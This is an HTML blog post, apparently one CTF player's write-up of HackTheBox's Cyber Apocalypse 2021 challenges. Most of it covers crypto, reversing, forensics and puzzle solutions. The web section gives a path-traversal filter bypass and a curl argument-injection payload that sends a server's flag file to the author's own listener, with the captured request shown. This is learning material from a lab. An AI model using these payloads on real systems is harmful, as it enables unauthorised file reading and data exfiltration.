@@ -1,0 +1,279 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Cyber Apocalypse 2021 // SixPraxis</title>
+    <link rel="shortcut icon" href="/images/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.82.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="SixPraxis" />
+    <meta name="description" content="HackTheBox&#39;s Cyber Apocalypse 2021 CTF" />
+    <link rel="stylesheet" href="https://sixpraxis.github.io/css/main.min.ce339e9f134fb14a441d35fa55b6b8b5fb176d6d1ab2dc3a19ff1022bd4c15e2.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Cyber Apocalypse 2021"/>
+<meta name="twitter:description" content="HackTheBox&#39;s Cyber Apocalypse 2021 CTF"/>
+
+    <meta property="og:title" content="Cyber Apocalypse 2021" />
+<meta property="og:description" content="HackTheBox&#39;s Cyber Apocalypse 2021 CTF" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sixpraxis.github.io/posts/cyberapocalypse2021/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-26T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-04-26T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://sixpraxis.github.io"><img class="app-header-avatar" src="/images/avatar.png" alt="SixPraxis" /></a>
+      <h1>SixPraxis</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Mostly interested in networking and cyber security, but into all sorts of things.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/sixpraxis" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://app.hackthebox.eu/profile/139574" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-htb">
+  <title>HackTheBox</title>
+  <path d="M11.996 0a1.119 1.119 0 0 0-.057.003a.9.9 0 0 0-.236.05a.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77V17.556a.889.889 0 0 0 .47.784l9.598 5.541l.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024c.01.001.011.003.016.004a.93.93 0 0 0 .296.015a.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532c0 .15-.08.287-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z" fill="#626262"/>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Cyber Apocalypse 2021</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 26, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          7 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://sixpraxis.github.io/tags/hackthebox/">hackthebox</a>
+              <a class="tag" href="https://sixpraxis.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://sixpraxis.github.io/tags/cyberapocalypse2021/">cyberapocalypse2021</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="cyber-apocalypse-2021">Cyber Apocalypse 2021</h1>
+<p><img src="/images/cyber-apocalypse-2021/cyberapocalypse2021.png" alt="Cyber Apocalypse 2021"></p>
+<p>I came into this one pretty out of practice. I haven&rsquo;t spent much time on the pentesting front since I started studying for my CCNA a few months back. I still had a lot of fun with it and will definitely be participating next year.</p>
+<h3 id="categories">Categories</h3>
+<ul>
+<li><a href="#Web">Web</a></li>
+<li><a href="#Crypto">Crypto</a></li>
+<li><a href="#Reversing">Reversing</a></li>
+<li><a href="#Forensics">Forensics</a></li>
+<li><a href="#Misc">Misc</a></li>
+</ul>
+<h2 id="Web">Web</h2>
+<h3 id="inspector-gadget">Inspector Gadget</h3>
+<p>Opening the url in a browser gives us a page showing a robot flying through space with CHTB{ in text above it. Hitting F12 in Firefox, we take a look at the source and find a comment with <code>1nsp3ction\_</code>. Switching to console shows us a log message: <code>us3full_1nf0rm4tion}</code>. Unfortunately, CHTB{1nsp3ction_us3full_1nf0rm4tion} is not a valid flag. Going to the style editor and checking main.css we find <code>c4n_r3ve4l\_</code>, our missing piece!</p>
+<blockquote>
+<p>CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}</p>
+</blockquote>
+<hr>
+<h3 id="ministryplace">MiniSTRyplace</h3>
+<p>This challenge lets you download a copy of the source code. There&rsquo;s a &ldquo;flag&rdquo; file in the root directory that contains a fake flag, giving us our target. Looking at index.php, we see a potential vulnerability.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    $lang <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;en.php&#39;</span>, <span style="color:#e6db74">&#39;qw.php&#39;</span>];
+        <span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;pages/&#39;</span> <span style="color:#f92672">.</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;lang&#39;</span>]) <span style="color:#f92672">?</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;../&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $_GET[<span style="color:#e6db74">&#39;lang&#39;</span>]) <span style="color:#f92672">:</span> $lang[<span style="color:#a6e22e">array_rand</span>($lang)]));
+    <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>This expression searches for ../ and removes it in an attempt to prevent LFI exploits. If we plan our input around the fact that any <em>../</em> will be removed, we can still perform the traversal we want.</p>
+<blockquote>
+<p>?lang=&hellip;/./&hellip;/./flag</p>
+</blockquote>
+<p>When the ../&rsquo;s are removed, they leave ../ in the URL. We make the request and the flag is printed!</p>
+<blockquote>
+<p>CHTB{b4d_4li3n_pr0gr4m1ng}</p>
+</blockquote>
+<hr>
+<h3 id="caas">CaaS</h3>
+<p>Includes a copy of the source code, which shows us the location of the flag file. The website shows a mock terminal that&rsquo;s running as root, with an unremovable curl command already entered.</p>
+<p>Looking at the source code, we can see submitting an IP make a POST request to an API endpoint that executes the curl command with the submitted IP.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;curl -sL &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">escapeshellcmd</span>($url);
+</code></pre></div><p>The escapeshellcmd doesn&rsquo;t stop us from doing some arguement injection and with the right ones we can force curl to POST the contents of the flag file to our own server. The -d option in curl will cause it to make a POST request, and the @ symbol lets us choose a file to use as the post data.</p>
+<p>We start a netcat listener to catch the request, then using Postman, we make a POST request to <em>http://138.68.152.10:31357/api/curl</em> and set the body&rsquo;s form-data with an &ldquo;ip&rdquo; key and a value containing our options and our ip.</p>
+<blockquote>
+<p>-d @../../flag xx.xx.xx.xx:4040</p>
+</blockquote>
+<pre><code>connect to [10.0.1.99] from (UNKNOWN) [138.68.152.10] 52042
+POST / HTTP/1.1
+Host: xx.xx.xx.xx:4040
+User-Agent: curl/7.64.0
+Accept: */*
+Content-Length: 33
+Content-Type: application/x-www-form-urlencoded
+
+CHTB{f1le_r3trieval_4s_a_s3rv1ce}
+</code></pre><p>Our netcat listener receives a connection and spits out our flag!</p>
+<hr>
+<h2 id="Crypto">Crypto</h2>
+<h3 id="nintendo-base64">Nintendo Base64</h3>
+<p>The download for this one is a txt file containing ASCII art of &ldquo;Nintendo64x8&rdquo;.</p>
+<p>To remove all the whitespace from the art:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cat output.txt | tr -d <span style="color:#e6db74">&#34; \t\n\r&#34;</span> &gt; output.encoded
+</code></pre></div><p>To decode the base64:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">base64 -d output.encoded | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
+</code></pre></div><p>We get the flag: CHTB{3nc0d1ng_n0t_3qu4l_t0_3ncrypt10n}</p>
+<hr>
+<h3 id="phasestream-1">PhaseStream 1</h3>
+<p>We&rsquo;re given a ciphertext and are told that the aliens used XOR with a repeating 5-byte key stream cipher.</p>
+<blockquote>
+<p>2e313f2702184c5a0b1e321205550e03261b094d5c171f56011904</p>
+</blockquote>
+<p>We know the first five characters of the flag are always <code>CHTB{</code>, which converted to binary using ASCII is:</p>
+<blockquote>
+<p>01000011 01001000 01010100 01000010 01111011</p>
+</blockquote>
+<p>2e 31 3f 27 02 in binary:</p>
+<blockquote>
+<p>00101110 00110001 00111111 00100111 00000010</p>
+</blockquote>
+<p>If we XOR the two, we get:</p>
+<blockquote>
+<p>01101101 01111001 01101011 01100101 01111001</p>
+</blockquote>
+<p>Which converted to ASCII is <code>mykey</code>. We decrypt the rest of the ciphertext using the key and get our flag!</p>
+<p>CHTB{u51ng_kn0wn_pl41nt3xt}</p>
+<hr>
+<h3 id="phasestream-2">PhaseStream 2</h3>
+<p>The aliens have hidden the flag inside of a file with 9999 lines of XOR ciphertext and the key is a single byte repeated.  I wrote a python script to brute force the lines.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">import</span> string
+<span style="color:#f92672">import</span> binascii
+
+check <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;CHTB{&#39;</span>
+keys <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>printable
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;output.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> file:
+    currentline <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>strip()
+    currentline <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(currentline)
+
+    <span style="color:#66d9ef">while</span> currentline:
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> keys:
+            possibleKey <span style="color:#f92672">=</span> currentline[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^</span> ord(i)
+            <span style="color:#66d9ef">if</span> chr(currentline[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">^</span> possibleKey) <span style="color:#f92672">==</span> check[<span style="color:#ae81ff">0</span>]:
+                <span style="color:#66d9ef">if</span> chr(currentline[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">^</span> possibleKey) <span style="color:#f92672">==</span> check[<span style="color:#ae81ff">1</span>]:
+                    <span style="color:#66d9ef">if</span> chr(currentline[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">^</span> possibleKey) <span style="color:#f92672">==</span> check[<span style="color:#ae81ff">2</span>]:
+                        <span style="color:#66d9ef">if</span> chr(currentline[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">^</span> possibleKey) <span style="color:#f92672">==</span> check[<span style="color:#ae81ff">3</span>]:
+                            <span style="color:#66d9ef">if</span> chr(currentline[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">^</span> possibleKey) <span style="color:#f92672">==</span> check[<span style="color:#ae81ff">4</span>]:
+                                decryptedString <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+                                <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> currentline:
+                                    xorValue <span style="color:#f92672">=</span> x <span style="color:#f92672">^</span> possibleKey
+                                    decryptedString <span style="color:#f92672">+=</span> chr(xorValue)
+                                
+                                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Line: &#34;</span> <span style="color:#f92672">+</span> str(binascii<span style="color:#f92672">.</span>hexlify(currentline)))
+                                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Key: &#34;</span> <span style="color:#f92672">+</span> chr(possibleKey))
+                                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Flag: &#34;</span> <span style="color:#f92672">+</span> decryptedString)
+
+        currentline <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>strip()
+        currentline <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(currentline)
+</code></pre></div><hr>
+<h3 id="phasestream-3">PhaseStream 3</h3>
+<p>The aliens are now using AES-CTR to encrypt the flags. We&rsquo;re given the source code for the encryption program and that contains a test line. The output file contains the encrypted test line and the encrypted flag. After a lot of research, I learned that ciphertext1 XOR ciphertext2 = plaintext1 XOR plaintext2. Using that principle, I wrote a python script to uncover the flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">import</span> binascii
+
+test <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;No right of private conversation was enumerated in the Constitution. I don&#39;t suppose it occurred to anyone at the time that it could be prevented.&#34;</span>
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;output.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> file:
+    line1 <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>strip()
+    line1 <span style="color:#f92672">=</span> line1[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">46</span>]
+    line1 <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(line1)
+    
+    line2 <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>strip()
+    line2 <span style="color:#f92672">=</span> line2[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">46</span>]
+    line2 <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(line2)
+
+keyStream1 <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(line1, <span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#f92672">^</span> int<span style="color:#f92672">.</span>from_bytes(line2, <span style="color:#e6db74">&#39;little&#39;</span>)
+
+plaintext1 <span style="color:#f92672">=</span> test[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">46</span>]
+plaintext2 <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(plaintext1, <span style="color:#e6db74">&#39;little&#39;</span>) <span style="color:#f92672">^</span> keyStream1
+
+<span style="color:#66d9ef">print</span>(plaintext2<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">46</span>, <span style="color:#e6db74">&#39;little&#39;</span>))
+</code></pre></div><blockquote>
+<p>CHTB{r3u53d_k3Y_4TT4cK}</p>
+</blockquote>
+<hr>
+<h2 id="Reversing">Reversing</h2>
+<h3 id="passphrase">Passphrase</h3>
+<p>We&rsquo;re given a little program that asks for a passphrase and issues an &ldquo;intruder alert&rdquo; if the wrong phrase is entered. I fired up gdb, set a break point when it asks for the passphrase and then stepped through the program looking for the value that it compares the entered phrase to. Eventually we get <code>3xtr4t3rR3stR14L5_VS_hum4n5</code>.</p>
+<p><img src="/images/cyber-apocalypse-2021/passphrase1.png" alt=""></p>
+<hr>
+<h2 id="Forensics">Forensics</h2>
+<h3 id="key-mission">Key mission</h3>
+<p>We&rsquo;re given a pcap file with USB traffic captured on it. The amount of interrupts is a good indicator that it&rsquo;s captured keyboard traffic. Examining the interrupt packets shows us an 8 byte HID Data field, which will contain the values for the key pressed to send that interrupt packet.</p>
+<p>I set the filter to <code>usbhid.data</code> and export the packet dissections as a txt file with all expanded checked.  Using grep and cut we remove all of the extra information and are only left with lines of 8 byte key data.</p>
+<blockquote>
+<p>grep &ldquo;HID Data:&rdquo; dataexport.txt | cut -d &quot; &quot; -f 3 &gt; keydata.txt</p>
+</blockquote>
+<p><img src="/images/cyber-apocalypse-2021/keymission1.png" alt=""></p>
+<p>I wrote a python script to translate the hex into key presses.</p>
+<p><img src="/images/cyber-apocalypse-2021/keymission2.png" alt=""></p>
+<p>After putting the output together we get the flag:</p>
+<blockquote>
+<p>CHTB{a_plac3_fAr_fAr_away_fr0m_earth}</p>
+</blockquote>
+<hr>
+<h3 id="invitation">Invitation</h3>
+<p>We get a .docm file with a malicious macro. The usual route would be to use olevba and extract the vba code that the macro runs, but hex strings in the output seemed to be missing something and leading to errors.</p>
+<p><img src="/images/cyber-apocalypse-2021/invitation1.png" alt=""></p>
+<p>I opened up the docm in LibreOffice, not letting the macro run, and went to the macro editor, copied all of the hex and manually cleaned it up using sed and tr until we had a solid block of hex.</p>
+<p>I popped the hex into cyberchef and got a block of base64 encoded text. We run <code>base64 -d</code> to decode it and we&rsquo;ve got the malicious vba code behind the macro. In the code there are some weird lines that have code written backwards.</p>
+<p><img src="/images/cyber-apocalypse-2021/invitation2.png" alt=""></p>
+<p>After reversing the lines and looking through them, I&rsquo;m able to put the flag together.</p>
+<blockquote>
+<p>CHTB{maldocs_are_the_new_meta}</p>
+</blockquote>
+<hr>
+<h2 id="Misc">Misc</h2>
+<h3 id="alien-camp">Alien Camp</h3>
+<p>We&rsquo;re told we need to take the alien&rsquo;s test and answer 500 questions in order to infiltrate their camp. Using netcat I connected to the provided IP and port, which gives us an option to look at a help guide or take the test. The test is a bunch of math questions that use the symbols shown in the help guide and requires an answer in less than a second. It looks like the value for each symbol changes every time the help guide is pulled up.</p>
+<p><img src="/images/cyber-apocalypse-2021/aliencamp1.png" alt=""></p>
+<p>I wrote a python script that saves the values for the symbols and then proceeds to do all the math. After question 500, the flag is captured!</p>
+<p><img src="/images/cyber-apocalypse-2021/aliencamp2.png" alt=""></p>
+<blockquote>
+<p>CHTB{3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3}</p>
+</blockquote>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
